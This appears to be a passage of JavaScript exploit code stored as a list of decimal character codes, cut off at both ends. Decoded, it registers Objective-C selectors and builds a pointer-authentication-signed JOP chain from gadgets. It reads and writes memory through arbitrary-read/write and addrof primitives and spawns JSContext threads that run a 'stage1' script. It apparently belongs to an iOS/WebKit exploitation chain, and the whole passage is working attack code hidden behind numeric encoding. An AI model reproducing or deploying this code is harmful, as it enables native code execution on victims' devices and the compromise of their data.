103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 108, 101, 97, 115, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 101, 108, 101, 97, 115, 101, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 58, 97, 116, 73, 110, 100, 101, 120, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 116, 97, 114, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 115, 116, 97, 114, 116, 34, 41, 41, 59, 10, 10, 108, 101, 116, 32, 105, 110, 118, 111, 107, 101, 95, 99, 108, 97, 115, 115, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 78, 83, 73, 110, 118, 111, 99, 97, 116, 105, 111, 110, 34, 41, 59, 10, 108, 101, 116, 32, 106, 115, 99, 95, 99, 108, 97, 115, 115, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 74, 83, 67, 111, 110, 116, 101, 120, 116, 34, 41, 59, 10, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 99, 108, 97, 115, 115, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 78, 83, 84, 104, 114, 101, 97, 100, 34, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 99, 115, 116, 114, 105, 110, 103, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 107, 67, 70, 83, 116, 114, 105, 110, 103, 69, 110, 99, 111, 100, 105, 110, 103, 85, 84, 70, 56, 41, 59, 10, 125, 10, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 98, 111, 120, 101, 100, 95, 97, 114, 114, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 105, 115, 78, 97, 78, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 115, 78, 97, 78, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 119, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 34, 41, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 95, 99, 111, 112, 121, 40, 99, 102, 115, 116, 114, 105, 110, 103, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 108, 101, 97, 115, 101, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 111, 98, 106, 44, 32, 99, 102, 115, 116, 114, 95, 107, 101, 121, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 44, 32, 99, 102, 115, 116, 114, 95, 107, 101, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 40, 111, 98, 106, 44, 32, 106, 115, 99, 114, 105, 112, 116, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 44, 32, 106, 115, 99, 114, 105, 112, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 40, 111, 98, 106, 44, 32, 115, 101, 108, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 44, 32, 115, 101, 108, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 40, 111, 98, 106, 44, 32, 115, 105, 103, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 44, 32, 115, 105, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 111, 98, 106, 44, 32, 97, 114, 103, 44, 32, 105, 100, 120, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 44, 32, 97, 114, 103, 44, 32, 105, 100, 120, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 40, 111, 98, 106, 44, 32, 116, 97, 114, 103, 101, 116, 44, 32, 115, 101, 108, 44, 32, 111, 98, 106, 101, 99, 116, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 44, 32, 116, 97, 114, 103, 101, 116, 44, 32, 115, 101, 108, 44, 32, 111, 98, 106, 101, 99, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 116, 97, 114, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 117, 112, 95, 102, 99, 97, 108, 108, 95, 106, 111, 112, 99, 104, 97, 105, 110, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 32, 61, 32, 109, 97, 108, 108, 111, 99, 40, 80, 65, 71, 69, 95, 83, 73, 90, 69, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 61, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 49, 48, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 32, 61, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 50, 48, 48, 110, 59, 10, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 48, 110, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 56, 110, 44, 32, 112, 97, 99, 105, 97, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 44, 32, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 95, 67, 70, 79, 98, 106, 101, 99, 116, 67, 111, 112, 121, 80, 114, 111, 112, 101, 114, 116, 121, 44, 32, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 52, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 50, 44, 32, 48, 110, 41, 41, 59, 10, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 50, 48, 110, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 52, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 50, 56, 110, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 45, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 51, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 48, 120, 52, 49, 52, 49, 52, 49, 52, 49, 110, 44, 32, 48, 120, 67, 50, 68, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 53, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 102, 99, 97, 108, 108, 95, 49, 52, 95, 97, 114, 103, 115, 95, 119, 114, 105, 116, 101, 95, 120, 56, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 53, 48, 110, 41, 41, 59, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 32, 58, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 34, 32, 58, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 51, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 34, 32, 58, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 44, 10, 32, 32, 32, 32, 125, 59, 10, 125, 10, 10, 108, 101, 116, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 48, 110, 59, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 95, 115, 112, 97, 119, 110, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 32, 61, 32, 48, 120, 48, 110, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 61, 61, 61, 32, 34, 115, 116, 114, 105, 110, 103, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 41, 59, 10, 32, 32, 32, 32, 125, 32, 101, 108, 115, 101, 32, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 61, 61, 61, 32, 34, 111, 98, 106, 101, 99, 116, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 125, 32, 101, 108, 115, 101, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 105, 110, 32, 116, 104, 105, 115, 32, 99, 97, 115, 101, 44, 32, 105, 116, 39, 115, 32, 97, 108, 114, 101, 97, 100, 121, 32, 97, 32, 67, 70, 83, 116, 114, 105, 110, 103, 44, 32, 115, 111, 32, 108, 101, 116, 39, 115, 32, 106, 117, 115, 116, 32, 99, 111, 112, 121, 32, 105, 116, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 95, 99, 111, 112, 121, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 32, 61, 32, 115, 101, 116, 117, 112, 95, 102, 99, 97, 108, 108, 95, 106, 111, 112, 99, 104, 97, 105, 110, 40, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 32, 32, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 34, 93, 59, 10, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 40, 106, 115, 99, 95, 99, 108, 97, 115, 115, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 118, 97, 108, 117, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 105, 115, 78, 97, 78, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 102, 117, 110, 99, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 105, 115, 110, 97, 110, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 97, 100, 100, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 105, 115, 110, 97, 110, 95, 102, 117, 110, 99, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 99, 111, 100, 101, 95, 112, 116, 114, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 105, 115, 110, 97, 110, 95, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 50, 56, 110, 59, 10, 32, 32, 32, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 115, 116, 97, 103, 101, 49, 95, 106, 115, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 97, 100, 100, 114, 111, 102, 32, 112, 114, 105, 109, 115, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 98, 111, 120, 101, 100, 95, 97, 114, 114, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 98, 117, 116, 116, 101, 114, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 56, 110, 44, 32, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 98, 117, 116, 116, 101, 114, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 114, 119, 54, 52, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 